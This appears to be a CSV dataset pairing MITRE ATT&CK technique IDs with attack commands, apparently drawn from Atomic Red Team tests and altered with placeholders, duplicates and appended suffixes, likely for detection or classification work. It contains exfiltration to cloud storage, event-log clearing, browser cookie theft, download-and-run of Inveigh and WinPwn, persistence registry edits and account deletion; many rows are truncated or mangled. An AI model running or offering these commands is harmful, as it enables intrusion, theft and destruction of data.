mitre_id,command
T1567,"write-host ""deploying aws infrastructure... "" -nonewline $awsaccesskey = ""var_140 ""@ $config | out-file -filepath ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf"" -encoding ascii write-host ""done!"" write-host ""exfiltrating data... "" -nonewline $bucket = ""$(pathtoatomicsfolder\..\externalpayloads\t1567.002\terraform-v*\terraform output bucket)"".replace(""`"""","""") cd pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone-v* $null = .\rclone copy --max-size 1700k ""pathtoatomicsfolder\..\externalpayloads\t1567.002\data\"" exfils3:$bucket --config ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf"" write-host ""done!"""
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_77337"""
T1070,$logs = get-eventlog -list | foreach-object {$_.log} $logs | foreach-object {clear-eventlog -logname $_ } get-eventlog -list
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd \c var_410"""
T1615,get-gpo -domain $env:userdnsdomain #{gpo_param} >> #{gpo_output}> /dev/null 2>&1 # id_71
T1036,"mkdir $home\... cp $(which sh) $home\... $home\...\sh -c ""echo var_381"""
T1048,"var_974"" https:\\file.io\"
T1220,"wmic var_557"""
T1648,"import-module  ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1""  -force  $access_key  =  ""var_301""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1648\src\t1648-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1648\src\t1648-1""  -terraformvariables  @(""profile=t1648-1"",  ""region=$region"")  invoke-lambdaattack  -awsprofile  ""t1648-1""  -awsregion  $region"
T1057,"start-process -filepath ""$env:programfiles\process hacker 2\var_99208"""
T1074,"invoke-webrequest ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.bat"" -outfile var_249"
T1005,"osascript  -e  'tell  application  ""finder""'  -e  'set  destinationfolderpath  to  posix  file  ""var_995  of  notesfolder'  -e  'repeat  with  afile  in  notesfiles'  -e  'duplicate  afile  to  folder  destinationfolderpath  with  replacing'  -e  'end'  -e  'end  tell'"
T1074,"compress-archive -path ""var_374 -force"
T1112,"reg add ""hklm\system\currentcontrolset\control\safeboot\minimal\atomicsafemode"" /ve /t reg_sz /f /d ""service""# run_7488"
T1055,"start-process ""var_845"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1132,echo -n 111-11-1111 | b64encode -r - curl -xpost var_498
T1556,"sudo sed -i ""var_102"
T1012,"get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\windows""  get-childitem  -path  ""hklm:software\microsoft\windows  nt\currentversion\""  |  findstr  windows  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runservicesonce""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\runservicesonce""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runservices""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\runservices""  get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\winlogon\notify""  get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\winlogon\userinit""  get-item  -path  ""hkcu:software\microsoft\windows  nt\currentversion\winlogon\\shell""  get-item  -path  ""hklm:software\microsoft\windows  nt\currentversion\winlogon\\shell""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\shellserviceobjectdelayload""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runonce""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\runonceex""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\run""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\run""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\runonce""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\policies\explorer\run""  get-item  -path  ""hkcu:software\microsoft\windows\currentversion\policies\explorer\run""  get-childitem  -path  ""hklm:system\currentcontrolset\services""  get-item  -path  ""hklm:software\microsoft\windows\currentversion\run""  get-item  -path  ""hklm:system\currentcontrolset\control\safeboot""  get-childitem  -path  ""hklm:software\microsoft\active  setup\installed  components""  get-childitem  -path  ""hklm:software\microsoft\windows\currentversion\group  policy\scripts\startup""> /dev/null 2>&1 # id_13"
T1115,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt# run_2643
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y> /dev/null 2>&1 # id_28"
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive# run_6232
T1134,"start-process  ""var_34843""  -argument  ""-u:t  -p:e  cmd""  start-sleep  -second  5  stop-process  -name  ""cmd""  -force  -erroraction  silentlycontinue"
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_5319
T1614,curl -k var_152
T1539,"stop-process  -name  ""chrome""  -force  -erroraction  silentlycontinue  ""select  host_key,  name,  encrypted_value,  path,  expires_utc,  is_secure,  is_httponly  from  [cookies];""  |  cmd  \c  var_958"""
T1098,"$credfile = ""var_630"
T1547,"set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\"" ""userinit"" ""userinit.exe, var_601"" -force"
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_751"")"
T1098,"$credfile  =  ""var_15491"
T1485,dd of=var_28352') iflag=count_bytes
T1123,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f# run_3241
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_818"
T1552,"find #{file_path}/.config/gcloud -name ""credentials.db"" -o -name ""access_tokens.db"" -type f 2>/dev/null"
T1127,"copy ""var_8590 \t:library %temp%\libhello.js"
T1571,test-netconnection  -computername  var_10782
T1091,"$removabledrives=@()  $removabledrives  =  get-wmiobject  -class  win32_logicaldisk  -filter  ""drivetype=2""  |  select-object  -expandproperty  deviceid  foreach  ($drive  in  $removabledrives)  {  write-host  ""removable  drive  found:""  $drive  new-item  -path  $drive\t1091test1.txt  -itemtype  ""file""  -force  -value  ""t1091  test  1  has  created  this  file  to  simulate  malware  spread  to  removable  drives.""  }> /dev/null 2>&1 # id_84"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""; echo 66 > $null"
T1547,cp #{calc_plist_path} ~/library/preferences/byhost/com.apple.loginwindow.plist# run_4231
T1127,"copy ""var_484 \t:library %temp%\libhello.js"
T1197,start-bitstransfer -priority foreground -source var_765
T1113,screencapture var_992
T1567,"write-host  ""deploying  aws  infrastructure...  ""  -nonewline  $awsaccesskey  =  ""var_15465  ""@  $config  |  out-file  -filepath  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  -encoding  ascii  write-host  ""done!""  write-host  ""exfiltrating  data...  ""  -nonewline  $bucket  =  ""$(pathtoatomicsfolder\..\externalpayloads\t1567.002\terraform-v*\terraform  output  bucket)"".replace(""`"""","""")  cd  pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone-v*  $null  =  .\rclone  copy  --max-size  1700k  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\data\""  exfils3:$bucket  --config  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  write-host  ""done!"""
T1490,vssadmin resize shadowstorage /for=c: /on=c: /maxsize=20%
T1547,"pnputil.exe /add-driver ""#{driver_inf}"""
T1580,"export aws_region=var_891 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1007,"echo ""[*] listing sysv init scripts (\etc\init.d):"" if [ -d \etc\init.d ]; then ls -l \etc\init.d; else echo ""\etc\init.d not present on this system""; fi echo echo ""[*] listing runlevel directories (\etc\rc*.d):"" ls -ld \etc\rc*.d 2>\dev\null || echo ""no \etc\rc*.d directories found"""
T1069,"new-item  -path  ""var_989"""
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_484"""
T1531,dscl  .  -delete  \users\var_492  #enter  admin  password
T1195,"kubectl run var_24857 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1489,sc.exe stop var_733
T1053,"systemd-run --unit=atomic-red-team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'# run_1652"
T1098,"import-module -name azuread $pword = convertto-securestring -string ""var_97919 #add required resource accesses $requiredresourcesaccess = new-object system.collections.generic.list[microsoft.open.azuread.model.requiredresourceaccess] $requiredresourcesaccess.add($requiredgraphaccess) #set permissions in existing azure ad app set-azureadapplication -objectid $aadapplication.objectid -requiredresourceaccess $requiredresourcesaccess $serviceprincipal = get-azureadserviceprincipal -filter ""appid eq '$($aadapplication.appid)'"" new-azureadserviceapproleassignment -objectid $serviceprincipal.objectid -principalid $serviceprincipal.objectid -resourceid $graphsp.objectid -id $reqpermission.id"
T1137,reg.exe add hkcu\software\microsoft\office\var_98425 \f
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_93751"
T1555,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azurepasswords.ps1"" $password = convertto-securestring -string ""var_70149"
T1001,"get-content ""#{image_file}"", ""#{tar_file}"" -encoding byte -readcount 0 | set-content ""#{new_image_file}"" -encoding byte"
T1562,"reg add ""hklm\system\currentcontrolset\control\deviceguard\scenarios\hypervisorenforcedcodeintegrity"" /v ""enabled"" /t reg_dword /d 0 /f"
T1614,var_71701
T1027,"$originalcommand  =  'var_84423)))"""
T1140,certutil -encode var_533 %temp%\t1140_calc.txt certutil -decode %temp%\t1140_calc.txt %temp%\t1140_calc_decoded.exe
T1012,"get-item -path ""hklm:software\microsoft\windows nt\currentversion\windows"" get-childitem -path ""hklm:software\microsoft\windows nt\currentversion\"" | findstr windows get-item -path ""hklm:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runservices"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservices"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\notify"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\userinit"" get-item -path ""hkcu:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows\currentversion\shellserviceobjectdelayload"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonceex"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\policies\explorer\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\policies\explorer\run"" get-childitem -path ""hklm:system\currentcontrolset\services"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hklm:system\currentcontrolset\control\safeboot"" get-childitem -path ""hklm:software\microsoft\active setup\installed components"" get-childitem -path ""hklm:software\microsoft\windows\currentversion\group policy\scripts\startup"""
T1619,"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done"
T1615,get-gpo -domain $env:userdnsdomain var_23240
T1187,rpcping -s var_433 \a connect \u ntlm 1>$null
T1531,sysadminctl  -deleteuser  var_820  #enter  admin  password
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""# run_2958"
T1136,aws iam create-user --user-name var_44274
T1489,taskkill.exe \f \im var_919
T1129,"var_90907"""
T1497,ping -c var_22963
T1083,"$out = ""var_155 # write results $tr | out-file -filepath $out -encoding utf8 write-output ""enumeration complete. results written to: $out"""
T1222,#{compiled_file} #{source_file}
T1070,"remove-item -path (join-path ""$env:systemroot\prefetch\"" (get-childitem -path ""$env:systemroot\prefetch\*.pf"" -name)[0])"
T1106,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe -debug
T1195,"kubectl run var_98023 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1033,"cmd.exe \c whoami wmic useraccount get \all quser \server:""var_96670 ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > computers.txt @for \f %n in (computers.txt) do @for \f ""tokens=1,2"" %i in ('qwinsta \server:%n ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > usernames.txt"
T1556,"sudo sed -i """" ""var_82918"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_450"
T1572,var_609 &
T1496,yes > /dev/null> /dev/null 2>&1 # id_54
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y"
T1132,echo  -n  111-11-1111  |  base64  curl  -xpost  var_289
T1614,var_29648
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh> /dev/null 2>&1 # id_36
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_273"""
